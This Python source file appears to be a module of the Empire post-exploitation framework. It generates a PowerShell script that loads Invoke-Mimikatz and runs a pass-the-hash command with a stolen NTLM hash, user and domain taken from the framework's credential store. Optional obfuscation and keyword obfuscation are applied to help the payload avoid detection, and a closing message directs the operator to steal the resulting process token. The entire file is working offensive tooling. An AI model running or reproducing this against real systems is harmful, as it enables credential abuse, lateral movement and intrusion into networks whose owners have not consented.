from __future__ import print_function

from builtins import object
from builtins import str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.database.models import Credential
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        # read in the common module source code
        module_source = main_menu.installPath + "/data/module_source/credentials/Invoke-Mimikatz.ps1"
        if obfuscate:
            data_util.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
            module_source = module_source.replace("module_source", "obfuscated_module_source")
        try:
            f = open(module_source, 'r')
        except:
            return handle_error_message("[!] Could not read module source path at: " + str(module_source))

        module_code = f.read()
        f.close()

        script = module_code

        # if a credential ID is specified, try to parse
        cred_id = params["CredID"]
        if cred_id != "":
            
            if not main_menu.credentials.is_credential_valid(cred_id):
                return handle_error_message("[!] CredID is invalid!")

            cred: Credential = main_menu.credentials.get_credentials(cred_id)
            if cred.credtype != "hash":
                return handle_error_message("[!] An NTLM hash must be used!")

            if cred.username != "":
                params["user"] = cred.username
            if cred.domain != "":
                params["domain"] = cred.domain
            if cred.password != "":
                params["ntlm"] = cred.password

        if params["ntlm"] == "":
            print(helpers.color("[!] ntlm hash not specified"))

        # build the custom command with whatever options we want
        command = "sekurlsa::pth /user:"+params["user"]
        command += " /domain:" + params["domain"]
        command += " /ntlm:" + params["ntlm"]

        # base64 encode the command to pass to Invoke-Mimikatz
        scriptEnd = "Invoke-Mimikatz -Command '\"" + command + "\"'"

        scriptEnd += ';"`nUse credentials/token to steal the token of the created PID."'
        if obfuscate:
            scriptEnd = helpers.obfuscate(main_menu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscation_command)
        script += scriptEnd
        script = data_util.keyword_obfuscation(script)

        return script
